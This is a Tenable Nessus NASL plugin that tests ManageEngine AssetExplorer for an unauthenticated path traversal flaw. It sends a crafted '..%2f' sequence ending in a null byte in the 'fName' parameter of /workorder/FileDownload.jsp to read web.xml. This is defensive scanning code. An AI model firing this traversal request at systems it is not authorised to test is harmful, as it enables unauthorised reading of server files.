#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(86885);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");


  script_name(english:"ManageEngine AssetExplorer Multiple Vulnerabilities");
  script_summary(english:"Attempts to retrieve a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine AssetExplorer running on the remote web
server is affected by multiple vulnerabilities :

  - A security bypass vulnerability exists due to a
    misconfiguration in web.xml that allows access to the
    URL /workorder/FileDownload.jsp without requiring
    authentication.

  - A path traversal vulnerability exists in the servlet
    that processes the URL /workorder/FileDownload.jsp due
    to improper sanitization of input to the 'fName'
    parameter.

Consequently, an unauthenticated, remote attacker can exploit these
issues, by using a crafted directory traversal sequence, to retrieve
arbitrary files through the web server, subject to the privileges that
it operates under.");
  script_set_attribute(attribute:"see_also", value:"https://www.manageengine.com/products/asset-explorer/sp-readme.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine AssetExplorer version 6.1 build 6113 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/09/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/09/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/11/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zoho:manageengine_assetexplorer");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("manageengine_assetexplorer_detect.nasl","os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("installed_sw/ManageEngine AssetExplorer");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

# The vulnerability is due to file path parsing in OS-specific way. 
# It looks like only Windows version is affected. 
# Skip non-Windows targets, but will continue if OS is not determined or 
# if report_paranoia = 2
if(report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if(os && "windows" >!< tolower(os))
    audit(AUDIT_OS_NOT, "Windows");
}
 
appname = "ManageEngine AssetExplorer";

# Plugin will exit if AssetExplorer not detected on the host
get_install_count(app_name:appname, exit_if_zero:TRUE);

# Branch off each http port
# Plugin will exit if AssetExplorer not detected on this http port
port = get_http_port(default:8080);
install = get_single_install(
  app_name            : appname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

# <PRODUCT_INSTALL_DIR>/server/default/log/support/<USER>/<fName>.zip
fs = '%2f';
file = '..' + fs + '..' + fs + '..' + fs + '..' + fs + '..' + fs +
      'applications' + fs +
      'extracted' + fs +
      'AdventNetAssetExplorer.eear' + fs +
      'AdventNetServiceDeskWC.ear' + fs +
      'AdventNetServiceDesk.war' + fs +
      'WEB-INF' + fs +
      'web.xml%00';

pattern = 'org.apache.jsp.workorder.FileDownload_jsp';
url = dir + '/workorder/FileDownload.jsp?' +
  'module=support&' +
  'fName=' + file;
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
res[2] = data_protection::sanitize_user_full_redaction(output:res[2]);
req = http_last_sent_request();
if (pattern >< res[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    request    : make_list(req),
    output     : res[2],
    generic    : TRUE,
    line_limit : 50
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
